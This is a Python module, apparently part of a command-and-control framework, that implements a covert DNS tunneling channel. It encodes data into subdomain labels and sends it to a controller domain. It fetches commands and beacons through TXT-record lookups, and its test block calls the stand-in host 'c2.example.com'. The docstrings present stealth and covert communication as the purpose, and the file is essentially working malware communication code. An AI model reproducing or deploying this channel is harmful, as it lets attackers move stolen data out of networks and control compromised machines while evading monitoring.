"""
DNS Protocol for C2 Communication
DNS tunneling for covert communication
"""

import asyncio
import base64
import dns.resolver
import dns.message
import dns.query
from typing import Dict, Optional
import logging

logger = logging.getLogger(__name__)


class DNSProtocol:
    """
    DNS C2 Protocol
    
    Features:
    - DNS tunneling
    - TXT record encoding
    - A record encoding
    - Query splitting for large data
    - Stealth communication
    """
    
    def __init__(self, domain: str, dns_server: str = "8.8.8.8"):
        self.domain = domain
        self.dns_server = dns_server
        self.max_label_length = 63
        self.max_query_length = 253
    
    def _encode_data(self, data: str) -> str:
        """Encode data for DNS query"""
        
        # Base32 encoding (DNS-safe)
        encoded = base64.b32encode(data.encode()).decode().lower()
        
        # Remove padding
        encoded = encoded.rstrip('=')
        
        return encoded
    
    def _decode_data(self, encoded: str) -> str:
        """Decode data from DNS response"""
        
        # Add padding if needed
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding
        
        decoded = base64.b32decode(encoded.upper()).decode()
        
        return decoded
    
    def _split_data(self, data: str) -> list:
        """Split data into DNS-safe chunks"""
        
        chunks = []
        
        # Split into label-sized chunks
        for i in range(0, len(data), self.max_label_length):
            chunks.append(data[i:i + self.max_label_length])
        
        return chunks
    
    async def send(self, data: Dict) -> bool:
        """Send data via DNS query"""
        
        try:
            # Convert data to string
            import json
            data_str = json.dumps(data)
            
            # Encode data
            encoded = self._encode_data(data_str)
            
            # Split into chunks
            chunks = self._split_data(encoded)
            
            # Send each chunk as DNS query
            for i, chunk in enumerate(chunks):
                query_domain = f"{chunk}.{i}.{self.domain}"
                
                # Perform DNS query
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [self.dns_server]
                
                try:
                    answers = resolver.resolve(query_domain, 'A')
                    logger.info(f"[DNSProtocol] Sent chunk {i+1}/{len(chunks)}")
                except dns.resolver.NXDOMAIN:
                    # Expected for C2 communication
                    pass
                except Exception as e:
                    logger.error(f"[DNSProtocol] Query error: {e}")
                
                # Small delay between queries
                await asyncio.sleep(0.1)
            
            return True
        
        except Exception as e:
            logger.error(f"[DNSProtocol] Send error: {e}")
            return False
    
    async def receive(self) -> Optional[Dict]:
        """Receive data via DNS TXT record"""
        
        try:
            # Query TXT record for commands
            query_domain = f"cmd.{self.domain}"
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            answers = resolver.resolve(query_domain, 'TXT')
            
            for rdata in answers:
                # Decode TXT record
                txt_data = rdata.to_text().strip('"')
                
                # Decode data
                decoded = self._decode_data(txt_data)
                
                # Parse JSON
                import json
                data = json.loads(decoded)
                
                return data
        
        except dns.resolver.NXDOMAIN:
            # No command available
            return None
        except Exception as e:
            logger.error(f"[DNSProtocol] Receive error: {e}")
            return None
    
    async def beacon(self, agent_id: str) -> Optional[Dict]:
        """Send beacon via DNS"""
        
        try:
            # Encode agent ID
            encoded_id = self._encode_data(agent_id)
            
            # Query for commands
            query_domain = f"{encoded_id}.beacon.{self.domain}"
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            try:
                answers = resolver.resolve(query_domain, 'TXT')
                
                for rdata in answers:
                    txt_data = rdata.to_text().strip('"')
                    
                    if txt_data:
                        decoded = self._decode_data(txt_data)
                        
                        import json
                        return json.loads(decoded)
            
            except dns.resolver.NXDOMAIN:
                # No command
                return None
        
        except Exception as e:
            logger.error(f"[DNSProtocol] Beacon error: {e}")
            return None


# Standalone test
if __name__ == "__main__":
    async def main():
        protocol = DNSProtocol("c2.example.com")
        
        # Test send
        await protocol.send({"message": "test", "agent_id": "123"})
        
        # Test receive
        data = await protocol.receive()
        print(data)
    
    asyncio.run(main())

